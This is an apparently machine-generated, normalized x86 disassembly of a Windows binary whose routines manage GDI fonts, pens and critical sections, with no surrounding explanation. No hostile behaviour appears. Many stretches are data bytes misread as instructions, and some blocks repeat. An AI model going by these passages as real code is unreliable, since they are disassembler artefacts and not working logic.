add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4f ] al
inc ecx
add [ eax - 0x4f ] cl
inc ecx
add [ eax ] ch
add [ eax ] al
add [ esi + edx + 0x41 ] al
add [ eax - 0xbffbfcc ] cl
inc ecx
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
xor [ eax ] eax
or al 0x32
inc eax
add [ edi + 0x3e340041 ] ah
inc ecx
add [ edx + ebp * 8 ] dh
inc ecx
add [ eax + 0x3d ] dl
inc ecx
add [ edi + edi - 0x163bffbf ] al
inc ecx
add [ edx + ebp - 0x157fffc0 ] cl
inc ecx
add [ edx + ebp + 0x2a8c0040 ] cl
inc eax
add al cl
jmp sub_41b144
sub_41b144
and al 0xec
inc ecx
add [ eax ] cl
push esp
inc edi
jb r-xdata
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
jo r-xdata
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + ebp + 0x540c0040 ] cl
imul esp [ ebx - 0x73 ] 0xb1580040
inc ecx
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
push ebx
push 0x64657261
dec ecx
or al 0x54
imul esp [ ebx - 0x24 ] 0xc80041b0
push ss
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
insd
popad
lea eax [ bx + si ]
and al 0xb2
jo r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
mov dl 0x41
add [ eax + eax ] dh
add [ eax - 0x4f ] bh
inc ecx
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + esi * 8 - 0xef7ffbf ] ch
inc ecx
add [ esp + edx * 2 ] cl
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
lea eax [ bx + si ]
test [ edx + 0x41 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x41 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
imul esp [ ebx + 0x73 ] 0xc4900000
mov cl 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
mov cl 0x41
add [ eax ] cl
add [ eax ] al
add [ eax - 0x77ffbff0 ] ah
xor al 0x40
add [ esp + esi + 0x34980040 ] dl
sub_41b148
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + ebp + 0x540c0040 ] cl
imul esp [ ebx - 0x73 ] 0xb1580040
inc ecx
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
push ebx
push 0x64657261
dec ecx
or al 0x54
imul esp [ ebx - 0x24 ] 0xc80041b0
push ss
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
insd
popad
lea eax [ bx + si ]
and al 0xb2
jo r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
mov dl 0x41
add [ eax + eax ] dh
add [ eax - 0x4f ] bh
inc ecx
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + esi * 8 - 0xef7ffbf ] ch
inc ecx
add [ esp + edx * 2 ] cl
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
lea eax [ bx + si ]
test [ edx + 0x41 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x41 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
imul esp [ ebx + 0x73 ] 0xc4900000
mov cl 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
mov cl 0x41
add [ eax ] cl
add [ eax ] al
add [ eax - 0x77ffbff0 ] ah
xor al 0x40
add [ esp + esi + 0x34980040 ] dl
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
sub_41b417
add [ eax - 0x14 ] bl
inc ecx
add [ edi + edx + 0x42 ] al
add [ eax + ebx + 0x18e40042 ] bh
inc edx
add al bh
sbb [ edx ] al
add eax 0x6f634954
outsb
mov eax eax
cmp [ ecx + eax * 2 + 0x54050700 ] dh
dec ecx
arpl [ edi + 0x6e ] bp
enter 0x41b3 0x0
push esp
mov cl 0x41
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
inc eax
add [ eax ] bl
mov ch 0x41
add [ eax ] dl
push esp
push edx
jo r-xdata
stosb [ edi ]
jne r-xdata
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
retn
cmp eax [ rw-data ]
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
je r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_41b430
outsd
outsb
mov eax eax
cmp [ ecx + eax * 2 + 0x54050700 ] dh
dec ecx
arpl [ edi + 0x6e ] bp
enter 0x41b3 0x0
push esp
mov cl 0x41
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
inc eax
add [ eax ] bl
mov ch 0x41
add [ eax ] dl
push esp
push edx
jo r-xdata
stosb [ edi ]
jne r-xdata
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
retn
cmp eax [ rw-data ]
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
je r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_41b468
mov ah 0xb4
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi * 4 + 0x240041 ] dh
add [ eax ] al
mov al [ 0xffffffff88004010 ]
xor al 0x40
add [ esp + esi + 0x34980040 ] dl
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax ] bl
mov ch 0x41
add [ eax ] dl
push esp
push edx
jae r-xdata
stosb [ edi ]
jne r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
je r-xdata
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
retn
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_41b4dc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_41b518
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_41b554
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_41b4c8
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_41b53c
xor edx edx
push ebp
push sub_41b628
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b62f
mov eax [ ebp - 0x4 ]
call sub_41b548
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_4026bc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_4028b8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_407b14
test al al
je r-xdata
sub_41b638
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_41b53c
xor ecx ecx
push ebp
push sub_41b6bf
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b548
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_41b6e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41b53c
xor eax eax
push ebp
push sub_41b751
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41b554
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41b638
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b758
mov eax [ ebp - 0x4 ]
call sub_41b548
retn
mov eax ebx
mov si 0xfffd
call sub_403454
sub_41b760
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41b53c
xor eax eax
push ebp
push sub_41b7bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b7c3
mov eax [ ebp - 0x4 ]
call sub_41b548
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_403454
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41b638
sub_41b7cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41b53c
xor edx edx
push ebp
push sub_41b82b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b832
mov eax [ ebp - 0x4 ]
call sub_41b548
retn
mov esi ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_41b838
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_413b18
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41b8d5
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4137ac
mov ebx eax
mov eax ebx
call sub_41d0c4
inc [ ebp - 0x4 ]
mov eax ebx
call sub_41d458
mov eax [ rw-data ]
call sub_41b7cc
mov eax [ rw-data ]
call sub_41b7cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b8dc
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_413b7c
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_4137ac
call sub_41d330
inc esi
dec ebx
jne r-xdata
sub_41bf2b
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_41325c
retn
sub_41bf5c
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x4
mov al [ esp + 0x17 ]
mov [ ebx + 0xa ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_402d64
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xb ]
mov cl 0x1f
call sub_402b54
mov al [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0x9 ] 0x8
mov [ ebx + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_41c010
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41b554
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_41c064
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41b638
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_41c0a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_413d50
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41bd68
xor eax eax
push ebp
push sub_41c163
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41bd68
xor eax eax
push ebp
push sub_41c146
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41b760
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41c1e4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c14d
mov eax [ ebp - 0x8 ]
call sub_41bd78
retn
mov eax ebx
call sub_41c468
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41c484
sub_41c194
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41bd68
xor eax eax
push ebp
push sub_41c1d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41b6e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c1e0
mov eax [ ebp - 0x4 ]
call sub_41bd78
retn
sub_41c1f8
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
xor edx edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41c381
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c388
lea eax [ ebp - 0x4c ]
mov edx 0x3
call sub_403fb4
retn
mov eax [ rw-data ]
call sub_41b53c
xor eax eax
push ebp
push sub_41c359
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41b548
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_4041f4
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_4083d4
lea eax [ ebp - 0x48 ]
mov edx rw-data
call sub_4041f4
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x24 ]
call sub_4083d4
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_4041f4
mov eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_407be4
test eax eax
jne r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x26 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_41c4dc
dec al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_41c3a0
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_41bf5c
mov edx esp
mov eax ebx
call sub_41c194
add esp 0x2c
pop esi
pop ebx
retn
sub_41c3cc
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41c17c
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_41c194
add esp 0x2c
pop esi
pop ebx
retn
sub_41c40c
push ebx
push esi
add esp 0xfffffed4
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x12c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_41c17c
lea eax [ esp + 0xb ]
xor ecx ecx
mov edx 0x20
call sub_402c64
lea eax [ esp + 0x2c ]
mov edx esi
mov ecx 0xff
call sub_40422c
lea edx [ esp + 0x2c ]
lea eax [ esp + 0xb ]
mov cl 0x1f
call sub_402b54
mov edx esp
mov eax ebx
call sub_41c194
sub_41c484
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call MulDiv
mov edx eax
neg edx
mov eax ebx
call sub_41c3cc
pop esi
pop ebx
retn
sub_41c4b0
push ebx
add esp 0xffffffd0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_41c17c
mov al [ esp ]
mov [ esp + 0xd ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_41c194
add esp 0x30
pop ebx
retn
sub_41c4e4
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41c17c
mov [ esp + 0x8 ] bl
mov edx esp
mov eax esi
call sub_41c194
add esp 0x2c
pop esi
pop ebx
retn
sub_41c514
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41c17c
mov [ esp + 0xa ] bl
mov edx esp
mov eax esi
call sub_41c194
add esp 0x2c
pop esi
pop ebx
retn
sub_41c53c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41b554
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_41c580
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41b638
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_41c5a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_413d50
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41bd68
xor eax eax
push ebp
push sub_41c647
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41bd68
xor eax eax
push ebp
push sub_41c62a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41b760
mov dl [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41c790
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c631
mov eax [ ebp - 0x8 ]
call sub_41bd78
retn
sub_41c660
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_41c678
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41bd68
xor eax eax
push ebp
push sub_41c6bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41b6e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c6c4
mov eax [ ebp - 0x4 ]
call sub_41bd78
retn
sub_41c6d0
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41c660
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_41c678
add esp 0x10
pop esi
pop ebx
retn
sub_41c6f8
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_41b53c
xor eax eax
push ebp
push sub_41c77e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41b548
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41bd24
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_41c7ac
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41c660
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_41c678
add esp 0x10
pop esi
pop ebx
retn
sub_41c7dc
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_41c660
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_41c678
sub_41c808
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41b554
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_41c848
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41b638
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
